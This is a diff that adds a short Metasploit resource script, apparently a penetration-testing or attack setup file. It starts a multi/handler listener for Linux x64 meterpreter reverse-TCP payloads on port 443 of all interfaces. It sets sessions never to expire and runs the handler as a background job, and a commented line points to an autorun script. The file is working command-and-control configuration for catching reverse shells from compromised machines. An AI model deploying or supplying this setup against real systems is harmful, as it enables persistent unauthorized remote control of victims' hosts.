@@ -1,0 +1,10 @@
+use multi/handler
+setg payload linux/x64/meterpreter/reverse_tcp
+setg LHOST 0.0.0.0
+setg LPORT 443
+set ExitOnSession false
+#set SessionCommunicationTimeout 0
+set SessionExpirationTimeout 0
+setg EXITFUNC thread
+#set AutoRunscript msfauto_lin.rc
+exploit -jz
